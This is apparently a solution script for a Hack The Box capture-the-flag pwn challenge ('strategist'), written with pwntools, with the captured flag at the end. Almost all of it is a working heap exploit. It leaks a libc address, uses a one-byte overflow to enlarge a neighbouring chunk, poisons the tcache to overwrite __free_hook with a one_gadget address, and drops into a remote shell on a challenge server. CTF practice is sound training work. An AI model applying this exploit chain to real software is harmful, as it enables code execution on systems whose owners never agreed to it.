from pwn import *

e = ELF("./strategist_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")
context.binary = e

'''
'''

script = '''
'''

def create_plan(size, data):
    p.sendafter(b"> ", b"1")
    p.sendlineafter(b"plan?", f"{size}".encode())
    if(size > 0):
        p.sendafter(b"plan.", data)

def show_plan(index):
    p.sendafter(b"> ", b"2")
    p.sendlineafter(b"view?", f"{index}".encode())

def edit_plan(index, data):
    p.sendafter(b"> ", b"3")
    p.sendlineafter(b"change?", f"{index}".encode())
    p.sendafter(b"plan.", data)

def delete_plan(index):
    p.sendafter(b"> ", b"4")
    p.sendlineafter(b"delete?", f"{index}".encode())

p = remote("94.237.51.215", 38050)
#p = process("./strategist_patched")
#p = gdb.debug("./strategist_patched", gdbscript = script)

# leak libc
create_plan(0x508, b"A" * 8)
for i in range(3): # use later for tcache poisoning
    create_plan(0x10, f"{i}".encode() * 8)
delete_plan(0)
create_plan(0x508, b"A" * 8)
show_plan(0)
p.recvuntil(b"A" * 8)
libc_base = u64(p.recv(6).ljust(8, b"\x00")) - 0x3ebca0
print(hex(libc_base))

# off by one -> change size of next chunk
delete_plan(0)
create_plan(0x508, b"A" * 0x508)
edit_plan(0, b"A" * 0x508 + p8(0x71))

# tcache poisoning
__free_hook = libc_base + libc.symbols['__free_hook']
one_shot = libc_base + 0x4f432

delete_plan(3)
delete_plan(2)
delete_plan(1)
create_plan(0x68, b"A" * 0x18 + p64(0x21) + p64(__free_hook)) # this chunk at index 1 and overlapping with 2 tcache bins
create_plan(0x10, b"A" * 8)
create_plan(0x10, p64(one_shot)) # this is __free_hook
delete_plan(0) # trigger 

p.interactive()
#HTB{0ld_r3l14bl3_l1bc_st1ll_3x15t5_8db8aa57ffe4d5a220485d0ac3b6f8a9}